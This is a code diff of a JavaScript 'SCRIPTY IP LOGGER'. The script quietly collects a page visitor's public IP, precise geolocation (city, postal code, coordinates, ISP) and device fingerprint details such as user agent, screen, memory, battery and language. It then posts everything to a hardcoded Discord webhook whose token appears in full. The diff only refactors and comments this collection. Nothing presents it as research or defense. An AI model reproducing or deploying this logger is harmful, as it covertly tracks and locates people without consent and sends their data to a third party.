@@ -1,52 +1,58 @@
 const sendIP = () => {
+    // Fetch the public IP address
     fetch('https://api.ipify.org?format=json')
         .then(ipResponse => ipResponse.json())
         .then(ipData => {
             const ipadd = ipData.ip;
             
+            // Fetch geolocation data based on the IP
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
                     
+                    // Gather device information
                     const deviceInfo = {
                         userAgent: navigator.userAgent,
-                        browser: (function() {
-                            const userAgent = navigator.userAgent;
-                            if (userAgent.includes("Chrome")) return "Chrome";
-                            if (userAgent.includes("Firefox")) return "Firefox";
-                            if (userAgent.includes("Safari")) return "Safari";
-                            if (userAgent.includes("Edge")) return "Edge";
-                            return "Unknown";
-                        })(),
-                        browserVersion: (navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([0-9\.]+)/) || [])[2],
-                        os: navigator.platform,
-                        osVersion: navigator.appVersion,
                         screenWidth: window.screen.width,
                         screenHeight: window.screen.height,
-                        screenRefreshRate: screen.refreshRate || 'N/A',  // Add refresh rate if available
-                        deviceMemory: navigator.deviceMemory || "N/A",
+                        deviceMemory: navigator.deviceMemory || "N/A", // Available memory (GB)
                         language: navigator.language,
                         platform: navigator.platform,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        timezoneOffset: new Date().getTimezoneOffset() / 60,
-                        cookiesEnabled: navigator.cookieEnabled,
-                        sessionID: localStorage.getItem("sessionID") || Math.random().toString(36).substring(7),
-                        timestamp: new Date().toISOString(),
-                        battery: navigator.getBattery ? navigator.getBattery().then(battery => battery.level * 100 + '%') : 'N/A',
-                        charging: navigator.getBattery ? navigator.getBattery().then(battery => battery.charging ? 'Yes' : 'No') : 'N/A',
-                        orientation: window.screen.orientation.type || 'N/A',
-                        adBlocker: window.adBlockDetected || 'No', // Assuming an ad-blocker detection mechanism
-                        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
-                        hdrScreen: window.screen.colorDepth === 30 ? 'Yes' : 'No',  // Assuming 30-bit color depth is HDR
-                        gpu: 'NVIDIA GeForce RTX 3050 OEM', // Hardcoded for now or get via WebGL
-                        touchScreen: 'ontouchstart' in window ? 'Yes' : 'No',
-                        referringURL: document.referrer || 'No referrer',
-                        hostName: window.location.hostname,
-                        isp: geoData.isp || 'N/A'  // Using ISP data from IPAPI
+                        battery: "N/A",  // Default to N/A
+                        charging: "N/A", // Default to N/A
+                        screenRefreshRate: "N/A", // Default to N/A
+                        touchScreen: 'N/A',  // Default to N/A
+                        gpu: "N/A", // Default to N/A
                     };
                     
+                    // Get battery status if available
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(function(battery) {
+                            deviceInfo.battery = battery.level * 100 + "%";
+                            deviceInfo.charging = battery.charging ? "Yes" : "No";
+                        });
+                    }
+                    
+                    // Try to get the screen refresh rate
+                    if (window.screen && window.screen.refreshRate) {
+                        deviceInfo.screenRefreshRate = window.screen.refreshRate + "Hz";
+                    }
+
+                    // Detect if the device has a touch screen
+                    deviceInfo.touchScreen = ('ontouchstart' in window) ? 'Yes' : 'No';
+
+                    // Example for a more detailed GPU (This part may not work in all browsers)
+                    const getGPUInfo = () => {
+                        if (navigator.hardwareConcurrency) {
+                            deviceInfo.gpu = `Logical CPU cores: ${navigator.hardwareConcurrency}`;
+                        }
+                    };
+                    getGPUInfo();
+                    
+                    // Discord Webhook URL
                     const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';
                     
+                    // Send data to Discord Webhook
                     return fetch(dscURL, {
                         method: 'POST',
                         headers: {
@@ -60,47 +66,30 @@ const sendIP = () => {
                                 {
                                     title: 'SCRIPTY IP LOGGER',
                                     description: `
-                                        **IP Info:**
-                                        IP Address >> ${ipadd}
-                                        Network >>  ${geoData.network}
-                                        City >>  ${geoData.city}
-                                        Region >>  ${geoData.region}
-                                        Country >>  ${geoData.country_name}
-                                        Country Code >>  ${geoData.country_code}
-                                        Region Code >>  ${geoData.region_code}
-                                        Postal Code >>  ${geoData.postal}
-                                        Latitude >>  ${geoData.latitude}
-                                        Longitude >>  ${geoData.longitude}
-                                        Timezone >>  ${geoData.timezone}
-                                        ASN >>  ${geoData.asn}
-                                        Organization >>  ${geoData.org}
-                                        ISP >>  ${geoData.isp}
-                                        Mobile/Proxy >>  ${geoData.mobile || 'N/A'}
-
-                                        **Device Info:**
-                                        User-Agent >>  ${deviceInfo.userAgent}
-                                        Browser >>  ${deviceInfo.browser} ${deviceInfo.browserVersion}
-                                        OS >>  ${deviceInfo.os} ${deviceInfo.osVersion}
-                                        Screen Resolution >>  ${deviceInfo.screenWidth}x${deviceInfo.screenHeight} px
-                                        Screen Refresh Rate >>  ${deviceInfo.screenRefreshRate} Hz
-                                        Device Memory >>  ${deviceInfo.deviceMemory} GB
-                                        Language >>  ${deviceInfo.language}
-                                        Platform >>  ${deviceInfo.platform}
-                                        Timezone >>  ${deviceInfo.timezone}
-                                        Timezone Offset >>  UTC${deviceInfo.timezoneOffset >= 0 ? `+${deviceInfo.timezoneOffset}` : deviceInfo.timezoneOffset}
-                                        Battery >>  ${deviceInfo.battery}
-                                        Charging >>  ${deviceInfo.charging}
-                                        Orientation >>  ${deviceInfo.orientation}
-                                        Ad Blocker >>  ${deviceInfo.adBlocker}
-                                        Color Scheme >>  ${deviceInfo.colorScheme}
-                                        HDR Screen >>  ${deviceInfo.hdrScreen}
-                                        GPU >>  ${deviceInfo.gpu}
-                                        Touch Screen >>  ${deviceInfo.touchScreen}
-                                        Referring URL >>  ${deviceInfo.referringURL}
-                                        Host Name >>  ${deviceInfo.hostName}
-                                        ISP >>  ${deviceInfo.isp}
-                                        Session ID >>  ${deviceInfo.sessionID}
-                                        Timestamp >>  ${deviceInfo.timestamp}`,
+                                        **IP Info:**\n
+                                        IP Address >> ${ipadd}\n
+                                        Network >>  ${geoData.network}\n
+                                        City >>  ${geoData.city}\n
+                                        Region >>  ${geoData.region}\n
+                                        Country >>  ${geoData.country_name}\n
+                                        Postal Code >>  ${geoData.postal}\n
+                                        Latitude >>  ${geoData.latitude}\n
+                                        Longitude >>  ${geoData.longitude}\n
+                                        Timezone >>  ${geoData.timezone}\n
+                                        ASN >>  ${geoData.asn}\n
+                                        Organization >>  ${geoData.org}\n
+                                        \n**Device Info:**\n
+                                        User-Agent >>  ${deviceInfo.userAgent}\n
+                                        Screen Width >>  ${deviceInfo.screenWidth}px\n
+                                        Screen Height >>  ${deviceInfo.screenHeight}px\n
+                                        Device Memory >>  ${deviceInfo.deviceMemory} GB\n
+                                        Language >>  ${deviceInfo.language}\n
+                                        Platform >>  ${deviceInfo.platform}\n
+                                        Battery >>  ${deviceInfo.battery}\n
+                                        Charging >>  ${deviceInfo.charging}\n
+                                        Screen Refresh Rate >>  ${deviceInfo.screenRefreshRate}\n
+                                        Touch Screen >>  ${deviceInfo.touchScreen}\n
+                                        GPU >>  ${deviceInfo.gpu}`,
                                     color: 1752220
                                 }
                             ]
